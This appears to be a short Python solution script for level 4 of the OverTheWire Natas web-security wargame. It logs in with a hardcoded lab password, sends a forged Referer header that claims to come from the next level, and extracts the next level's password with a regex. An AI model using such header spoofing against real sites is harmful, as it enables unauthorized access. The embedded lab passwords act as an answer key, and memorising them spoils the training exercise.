import requests as req
import re


username="natas4"
password='QryZXc2e0zahULdHrtHxzyYkj59kUxLQ'

url="http://natas4.natas.labs.overthewire.org/"
header={
    "Referer":"http://natas5.natas.labs.overthewire.org/"
}
response=req.get(url,auth=(username,password),headers=header)

print(re.findall("Access granted. The password for natas5 is (.*)",response.text)[0])

